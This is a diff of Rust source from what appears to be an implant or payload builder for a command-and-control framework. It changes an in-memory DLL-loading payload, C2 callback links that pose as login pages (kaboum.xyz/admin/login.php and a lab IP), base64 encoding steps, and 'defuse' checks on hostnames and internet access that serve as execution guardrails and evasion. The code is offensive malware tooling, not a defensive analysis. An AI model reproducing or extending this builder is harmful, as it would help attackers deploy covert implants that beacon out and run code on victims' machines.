@@ -181,13 +181,13 @@ exec(decoded_script)
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
             link: Link::MEMORY(MemoryLink {
-                memory_nb: 3,
+                memory_nb: 4,
                 dataoperation: payload_dataoperation,
                 jitt: 0,
                 sleep: 0,
             }),
             dll_entrypoint: String::from("DllInstall"),
-            thread: true,
+            thread: false,
         })];
     } else if payload == "wstunnel".to_string() {
         // cp ~/wstunnel/target/x86_64-pc-windows-gnu/release/wstunnel.exe  ~/.malleable/payload/
@@ -246,7 +246,7 @@ exec(decoded_script)
     let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::from([(
         1,
         (
-            "kaboum.xyz first links".to_string(),
+            "postC2".to_string(),
             PoolLinks {
                 pool_mode: PoolMode::ADVANCED(Advanced {
                     random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
@@ -257,28 +257,31 @@ exec(decoded_script)
                     stop_new: false, // stop if found a new conf -> not for parallel
                     accept_old: false, // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
                 }),
-                pool_links: vec![                    
-                    Link::HTTPPostC2(HTTPPostC2Link {
+                pool_links: vec![        
+                /* 
+                Link::HTTPPostC2(HTTPPostC2Link {
                         url: String::from("https://kaboum.xyz/admin/login.php"),
-                        dataoperation: vec![],
-                        dataoperation_post: vec![],
+                        dataoperation: vec![DataOperation::WEBPAGE,DataOperation::BASE64],
+                        dataoperation_post: vec![DataOperation::BASE64,DataOperation::BASE64],
                         jitt: 0,
                         sleep: 0,
-                    }),
+                    }),*/
                     Link::HTTPPostC2(HTTPPostC2Link {
                         url: String::from("http://192.168.56.1:3000/login.php"),
-                        dataoperation: vec![],
+                        //dataoperation: vec![DataOperation::BASE64],
+                        dataoperation: vec![DataOperation::BASE64,DataOperation::BASE64],
                         dataoperation_post: vec![],
                         jitt: 0,
                         sleep: 0,
                     }),
+
                 ],
             },
         ),
     )]);
 
-    //let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::new();
     /*
+    //let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::new();
     let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::from([
         (
             1,
@@ -360,7 +363,7 @@ exec(decoded_script)
             ),
         ),
     ]);
-    */
+    // */
 
     // payload is define, now, CREATE the
     info!("[+] LOAD ed25519 keypair from {:?}", keypair);
@@ -370,14 +373,15 @@ exec(decoded_script)
         &key_pair_ed25519,
         pool_links,
         payload_choice,
-        vec![Defuse::CheckInternet(CheckInternet {
+        vec![ /* Defuse::CheckInternet(CheckInternet {
             list: vec![
                 "https://www.microsoft.com".to_string(),
                 "https://google.com".to_string(),
                 "https://login.microsoftonline.com".to_string(),
             ],
             operator: Operator::AND,
-        })],
+        }) */
+        ],
         vec![
             Defuse::Hostname(Hostname {
                 list: vec!["DEBUG-W10".to_string(), "DRACONYS".to_string()],
